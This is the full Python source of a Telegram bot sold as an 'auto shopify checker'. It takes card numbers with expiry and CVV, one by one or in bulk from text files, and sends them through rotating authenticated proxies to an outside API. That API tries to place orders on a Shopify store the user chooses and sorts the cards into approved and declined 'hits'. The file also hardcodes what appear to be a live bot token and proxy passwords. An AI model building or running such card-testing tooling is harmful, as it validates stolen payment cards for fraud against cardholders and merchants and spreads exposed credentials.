import asyncio
import httpx
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode, ChatAction
import logging
import os
import time
import html
import random
import io
import traceback
from datetime import datetime

# --- Enhanced Logging Setup ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding='utf-8')
    ]
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"

# Premium Proxy List
PROXY_LIST = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
    *[f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in [
        "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
        "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
        "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
        "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
        "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
        "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
        "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
        "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
        "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
        "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
    ]]
]

COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# --- User Data Management ---
USER_SITES_FILE = "user_shopify_sites.json"
current_user_shopify_site = {}

def load_user_sites():
    global current_user_shopify_site
    try:
        if os.path.exists(USER_SITES_FILE):
            with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
                current_user_shopify_site = {int(k): v for k, v in json.load(f).items()}
    except Exception as e:
        logger.error(f"Failed to load user sites: {e}")
        current_user_shopify_site = {}

def save_user_sites():
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(current_user_shopify_site, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save user sites: {e}")

def get_site_for_user(user_id):
    return current_user_shopify_site.get(user_id)

def set_site_for_user(user_id, site_url):
    current_user_shopify_site[user_id] = site_url
    save_user_sites()

# --- Enhanced API Helpers ---
def parse_checker_api_response(response_text: str):
    try:
        json_start = response_text.find('{')
        json_end = response_text.rfind('}')
        if json_start == -1 or json_end == -1:
            return None
        return json.loads(response_text[json_start:json_end+1])
    except Exception as e:
        logger.error(f"Failed to parse API response: {e}")
        return None

async def get_bin_details(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            "bin": bin_number,
            "scheme": "N/A",
            "type": "N/A",
            "brand": "N/A",
            "bank_name": "N/A",
            "country_name": "N/A",
            "country_emoji": "🌐",
            "error": "Invalid BIN"
        }

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
    mounts = {'all://': proxy} if proxy else None

    try:
        headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(mounts=mounts, timeout=15.0) as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "bin": bin_number,
                    "scheme": data.get("scheme", "N/A").upper(),
                    "type": data.get("type", "N/A").upper(),
                    "brand": data.get("brand", "N/A").upper(),
                    "bank_name": data.get("bank", {}).get("name", "N/A"),
                    "country_name": data.get("country", {}).get("name", "N/A"),
                    "country_emoji": data.get("country", {}).get("emoji", "🌐")
                }
            return {
                "bin": bin_number,
                "scheme": "N/A",
                "type": "N/A",
                "brand": "N/A",
                "bank_name": "N/A",
                "country_name": "N/A",
                "country_emoji": "🌐",
                "error": f"API Error {response.status_code}"
            }
    except Exception as e:
        logger.error(f"BIN lookup failed via {proxy_host} for {bin_number}: {e}")
        return {
            "bin": bin_number,
            "scheme": "N/A",
            "type": "N/A",
            "brand": "N/A",
            "bank_name": "N/A",
            "country_name": "N/A",
            "country_emoji": "🌐",
            "error": "Lookup failed"
        }

# --- Stylish Message Templates ---
def generate_header(title):
    return f"<b>┌──────────────────────────────┐</b>\n<b>│  🚀 {title.upper()}  │</b>\n<b>└──────────────────────────────┘</b>\n"

def generate_footer(user, time_taken=None, proxy=None):
    footer = f"\n<b>┌──────────────────────────────┐</b>\n"
    footer += f"<b>│  👤 User:</b> {html.escape(user.first_name)}\n"
    if time_taken:
        footer += f"<b>│  ⏱ Time:</b> {time_taken}s\n"
    if proxy:
        footer += f"<b>│  🌐 Proxy:</b> {proxy}\n"
    footer += f"<b>│  🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</b>\n"
    footer += f"<b>└──────────────────────────────┘</b>"
    return footer

# --- Enhanced Bot Commands ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_msg = generate_header("auto shopify checker")
    welcome_msg += f"""
<b>🔹 Welcome, {html.escape(user.first_name)}!</b>

<i>Premium Shopify card checking utility with blazing fast speeds and high accuracy.</i>

<b>📊 Stats:</b>
├ <b>Users:</b> {len(current_user_shopify_site)}
├ <b>Proxies:</b> {len(PROXY_LIST)}
└ <b>Uptime:</b> 100%

<b>💎 Features:</b>
├ Real-time checking
├ BIN lookup
├ Mass checker
└ Premium proxies

<b>Choose an option below to get started:</b>
"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 Set Target Site", callback_data="site:prompt_add")],
        [InlineKeyboardButton("📊 Check Single Card", callback_data="nav:single_check"),
         InlineKeyboardButton("📁 Mass Check", callback_data="nav:mass_check")],
        [InlineKeyboardButton("📋 Commands", callback_data="nav:show_cmds"),
         InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/alanjocc")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="nav:refresh")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_msg = generate_header("command list")
    commands_msg += """
<b>🔹 GENERAL COMMANDS</b>
├ /start - Show main menu
├ /cmds - Show this command list
└ /stats - Show bot statistics

<b>🔹 SITE MANAGEMENT</b>
├ /add <code>&lt;url&gt;</code> - Set target site
└ /my_site - Show current site

<b>🔹 CHECKING COMMANDS</b>
├ /chk <code>N|M|Y|C</code> - Check single card
└ /mchk - Mass check (reply to .txt)

<b>🔹 UTILITY COMMANDS</b>
├ /bin <code>123456</code> - BIN lookup
└ /proxy - Test proxy speed
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text(commands_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(commands_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text(
            generate_header("site setup") + 
            "⚠️ Please provide a Shopify site URL.\n\n"
            "Usage: <code>/add https://yourshopifystore.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    site_url = context.args[0].strip()
    if not site_url.startswith(('http://', 'https://')):
        site_url = f"https://{site_url}"
    
    set_site_for_user(user_id, site_url)
    
    await update.message.reply_text(
        generate_header("site setup") + 
        f"✅ Successfully set your Shopify site to:\n<code>{html.escape(site_url)}</code>"
        + generate_footer(update.effective_user),
        parse_mode=ParseMode.HTML
    )

async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    site_url = get_site_for_user(user_id)
    
    if not site_url:
        await update.message.reply_text(
            generate_header("current site") + 
            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
            parse_mode=ParseMode.HTML
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🔄 Change Site", callback_data="site:prompt_add")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        generate_header("current site") + 
        f"🔹 Your current Shopify site:\n\n<code>{html.escape(site_url)}</code>"
        + generate_footer(update.effective_user),
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    
    if not shopify_site:
        await update.message.reply_text(
            generate_header("card check") + 
            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not context.args or context.args[0].count('|') != 3:
        await update.message.reply_text(
            generate_header("card check") + 
            "⚠️ Invalid format. Use: <code>/chk N|M|Y|C</code>\n\n"
            "<b>Example:</b> <code>/chk 4111111111111111|12|2025|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    start_time = time.time()
    
    cc_details_full = context.args[0]
    card_number = cc_details_full.split('|')[0]
    bin_data_task = asyncio.create_task(get_bin_details(card_number[:6]))
    
    params = {"site": shopify_site, "cc": cc_details_full}
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
    mounts = {'all://': proxy} if proxy else None
    
    try:
        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=45.0) as client:
            response = await client.get(CHECKER_API_URL, params=params)
        
        api_data = parse_checker_api_response(response.text)
        if api_data:
            api_response_text = api_data.get("Response", "Unknown")
            if "DECLINED" in api_response_text.upper():
                status_emoji, status_text = "❌", "DECLINED"
                status_color = "#FF0000"
            elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
                status_emoji, status_text = "✅", "APPROVED"
                status_color = "#00FF00"
            else:
                status_emoji, status_text = "⚠️", "UNKNOWN"
                status_color = "#FFFF00"
            
            gateway = api_data.get("Gateway", "N/A")
            price = api_data.get("Price", "0.00")
            response_display = api_response_text
        else:
            status_emoji, status_text = "❓", "PARSE ERROR"
            status_color = "#FFA500"
            gateway, price, response_display = "N/A", "0.00", response.text[:100].strip()
    except Exception as e:
        status_emoji, status_text = "💥", "ERROR"
        status_color = "#FF0000"
        gateway, price, response_display = "N/A", "0.00", str(e)
        logger.error(f"Error in chk_command: {e}")
    
    time_taken = round(time.time() - start_time, 2)
    b = await bin_data_task
    bin_info_str = " / ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
    
    result_message = generate_header("check result")
    result_message += f"""
<b>🛡 Status:</b> <span style="color: {status_color}">{status_emoji} {status_text}</span>
<b>💳 Card:</b> <code>{html.escape(cc_details_full)}</code>
<b>💰 Amount:</b> <code>{price}</code>
<b>🚪 Gateway:</b> <code>{gateway}</code>

<b>🔹 BIN Information:</b>
├ <b>BIN:</b> <code>{b.get('bin', 'N/A')}</code>
├ <b>Type:</b> <code>{bin_info_str}</code>
├ <b>Bank:</b> <code>{b.get('bank_name', 'N/A')}</code>
└ <b>Country:</b> {b.get('country_emoji', '🌐')} <code>{b.get('country_name', 'N/A')}</code>

<b>🔹 Response:</b>
<code>{html.escape(response_display[:400])}</code>
"""
    result_message += generate_footer(update.effective_user, time_taken, proxy_host)
    
    keyboard = [
        [InlineKeyboardButton("🔁 Check Again", callback_data="nav:single_check")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    
    if not shopify_site:
        await update.message.reply_text(
            generate_header("mass check") + 
            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            generate_header("mass check") + 
            "⚠️ Please reply to a .txt file containing cards.\n\n"
            "<b>Format:</b> One card per line in <code>N|M|Y|C</code> format",
            parse_mode=ParseMode.HTML
        )
        return
    
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    
    try:
        file = await update.message.reply_to_message.document.get_file()
        file_content = (await file.download_as_bytearray()).decode('utf-8')
        cards = [line.strip() for line in file_content.split('\n') if line.strip()]
        
        if not cards:
            await update.message.reply_text(
                generate_header("mass check") + 
                "⚠️ No valid cards found in the file.",
                parse_mode=ParseMode.HTML
            )
            return
        
        total_cards = len(cards)
        start_time = time.time()
        processing_msg = await update.message.reply_text(
            generate_header("mass check") + 
            f"🔹 Processing <code>{total_cards}</code> cards...\n"
            f"├ <b>Site:</b> <code>{html.escape(shopify_site)}</code>\n"
            f"└ <b>Started:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
            "<i>Please wait, this may take some time...</i>",
            parse_mode=ParseMode.HTML
        )
        
        results = []
        approved = 0
        declined = 0
        errors = 0
        
        for i, card in enumerate(cards):
            if card.count('|') != 3:
                results.append(f"{card} -> INVALID FORMAT")
                errors += 1
                continue
            
            try:
                params = {"site": shopify_site, "cc": card}
                proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
                mounts = {'all://': proxy} if proxy else None
                
                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=30.0) as client:
                    response = await client.get(CHECKER_API_URL, params=params)
                
                api_data = parse_checker_api_response(response.text)
                if api_data:
                    api_response_text = api_data.get("Response", "Unknown")
                    if "DECLINED" in api_response_text.upper():
                        status = "DECLINED"
                        declined += 1
                    elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
                        status = "APPROVED"
                        approved += 1
                    else:
                        status = "UNKNOWN"
                        errors += 1
                    
                    gateway = api_data.get("Gateway", "N/A")
                    price = api_data.get("Price", "0.00")
                    results.append(f"{card} -> {status} | {gateway} | {price}")
                else:
                    results.append(f"{card} -> PARSE ERROR")
                    errors += 1
                
                # Update progress every 5 cards
                if (i + 1) % 5 == 0 or (i + 1) == total_cards:
                    progress = f"Processed: {i+1}/{total_cards} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}"
                    await processing_msg.edit_text(
                        generate_header("mass check") + 
                        f"🔹 Processing <code>{total_cards}</code> cards...\n"
                        f"├ <b>Site:</b> <code>{html.escape(shopify_site)}</code>\n"
                        f"└ <b>Progress:</b> {progress}\n\n"
                        "<i>Please wait, this may take some time...</i>",
                        parse_mode=ParseMode.HTML
                    )
            
            except Exception as e:
                results.append(f"{card} -> ERROR: {str(e)}")
                errors += 1
                logger.error(f"Error processing card {card}: {e}")
        
        time_taken = round(time.time() - start_time, 2)
        result_content = "\n".join(results)
        result_filename = f"ShopifyResults_{approved}Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with io.BytesIO(result_content.encode('utf-8')) as result_file:
            result_file.name = result_filename
            await update.message.reply_document(
                document=result_file,
                caption=generate_header("mass check results") + 
                f"🔹 <b>Total Cards:</b> <code>{total_cards}</code>\n"
                f"├ <b>✅ Approved:</b> <code>{approved}</code>\n"
                f"├ <b>❌ Declined:</b> <code>{declined}</code>\n"
                f"└ <b>⚠️ Errors:</b> <code>{errors}</code>\n\n"
                f"<b>⏱ Time Taken:</b> <code>{time_taken}s</code>"
                + generate_footer(update.effective_user),
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        logger.error(f"Mass check error: {e}")
        await update.message.reply_text(
            generate_header("mass check") + 
            f"⚠️ An error occurred during mass check:\n<code>{html.escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args[0]) < 6:
        await update.message.reply_text(
            generate_header("bin lookup") + 
            "⚠️ Please provide a valid BIN (first 6 digits of card).\n\n"
            "Usage: <code>/bin 123456</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    bin_number = context.args[0][:6]
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    
    bin_data = await get_bin_details(bin_number)
    
    bin_info = generate_header("bin information")
    bin_info += f"""
<b>🔹 BIN:</b> <code>{bin_data.get('bin', 'N/A')}</code>
<b>🔹 Scheme:</b> <code>{bin_data.get('scheme', 'N/A')}</code>
<b>🔹 Type:</b> <code>{bin_data.get('type', 'N/A')}</code>
<b>🔹 Brand:</b> <code>{bin_data.get('brand', 'N/A')}</code>

<b>🏦 Bank:</b> <code>{bin_data.get('bank_name', 'N/A')}</code>
<b>🌍 Country:</b> {bin_data.get('country_emoji', '🌐')} <code>{bin_data.get('country_name', 'N/A')}</code>
"""
    
    if 'error' in bin_data:
        bin_info += f"\n⚠️ <b>Note:</b> <code>{bin_data['error']}</code>\n"
    
    bin_info += generate_footer(update.effective_user)
    
    keyboard = [
        [InlineKeyboardButton("🔁 Lookup Another", callback_data="nav:bin_lookup")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(bin_info, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_msg = generate_header("bot statistics")
    stats_msg += f"""
<b>📊 Bot Stats:</b>
├ <b>👥 Total Users:</b> <code>{len(current_user_shopify_site)}</code>
├ <b>🌐 Active Proxies:</b> <code>{len(PROXY_LIST)}</code>
└ <b>⏳ Uptime:</b> <code>100%</code>

<b>🔧 System Info:</b>
├ <b>Python:</b> <code>3.11</code>
├ <b>Library:</b> <code>python-telegram-bot 20.3</code>
└ <b>Last Update:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
"""
    stats_msg += generate_footer(update.effective_user)
    
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="nav:refresh_stats")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(stats_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

# --- Callback Handlers ---
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data == "nav:show_start":
        await start_command(update, context)
    elif data == "nav:show_cmds":
        await cmds_command(update, context)
    elif data == "nav:refresh":
        await start_command(update, context)
    elif data == "nav:refresh_stats":
        await stats_command(update, context)
    elif data == "site:prompt_add":
        await query.message.reply_text(
            generate_header("set site") + 
            "🔹 Please send your Shopify site URL in the format:\n\n"
            "<code>/add https://yourshopifystore.com</code>",
            parse_mode=ParseMode.HTML
        )
    elif data == "site:show_current":
        await my_site_command(update, context)
    elif data == "nav:single_check":
        await query.message.reply_text(
            generate_header("single check") + 
            "🔹 Please send the card details in format:\n\n"
            "<code>/chk 4111111111111111|12|2025|123</code>",
            parse_mode=ParseMode.HTML
        )
    elif data == "nav:mass_check":
        await query.message.reply_text(
            generate_header("mass check") + 
            "🔹 Please reply to a .txt file containing cards with:\n\n"
            "<code>/mchk</code>\n\n"
            "<b>Format:</b> One card per line in <code>N|M|Y|C</code> format",
            parse_mode=ParseMode.HTML
        )
    elif data == "nav:bin_lookup":
        await query.message.reply_text(
            generate_header("bin lookup") + 
            "🔹 Please send the BIN (first 6 digits) to lookup:\n\n"
            "<code>/bin 123456</code>",
            parse_mode=ParseMode.HTML
        )

# --- Error Handling ---
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
    tb_string = "".join(tb_list)
    
    error_msg = (
        f"An exception was raised while handling an update\n"
        f"<pre>{html.escape(tb_string)}</pre>"
    )
    
    if update and isinstance(update, Update):
        await update.effective_message.reply_text(
            generate_header("error") + 
            "⚠️ An unexpected error occurred. The developer has been notified.\n\n"
            "Please try again later.",
            parse_mode=ParseMode.HTML
        )

# --- Main Application ---
def main():
    if not TELEGRAM_BOT_TOKEN:
        logger.critical("Telegram Bot Token is missing!")
        return
    
    logger.info("Starting bot...")
    load_user_sites()
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Command Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("my_site", my_site_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Callback Handlers
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    
    # Error Handler
    application.add_error_handler(error_handler)
    
    logger.info("Bot is now running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
